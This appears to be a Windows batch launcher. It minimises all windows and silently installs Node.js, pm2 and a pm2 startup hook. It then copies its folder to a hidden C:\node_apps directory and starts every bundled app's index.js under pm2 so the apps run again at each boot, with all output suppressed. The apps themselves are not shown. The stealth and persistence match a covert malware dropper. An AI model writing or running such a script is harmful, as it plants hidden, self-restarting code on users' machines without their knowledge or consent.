@echo off
powershell -Command "(New-Object -ComObject Shell.Application).minimizeall()"
node -v > nul 2> nul
if %errorlevel% neq 0 (
    start /wait winget install OpenJS.NodeJS.LTS --accept-source-agreements > nul 2> nul
    set "PATH=%PATH%;C:\Program Files\nodejs"
    > nul 2> nul call npm i pm2 -g
    > nul 2> nul call npm i pm2-windows-startup -g
    > nul 2> nul call pm2-startup install
    > nul 2> nul call xcopy /E /I /C /Y "%~dp0" "C:\node_apps"
    > nul 2> nul call attrib +h "C:\node_apps"
    > nul 2> nul call cd "C:\node_apps"
    for /D %%s in (.\apps\*) do (
        > nul 2> nul call cd %%s
        > nul 2> nul call npm i
        > nul 2> nul call pm2 start index.js --merge-logs -i 1 
        > nul 2> nul call pm2 save
        > nul 2> nul call cd ..\..
    ) > nul 2> nul
    exit /b 0
) else (
    exit /b 0
)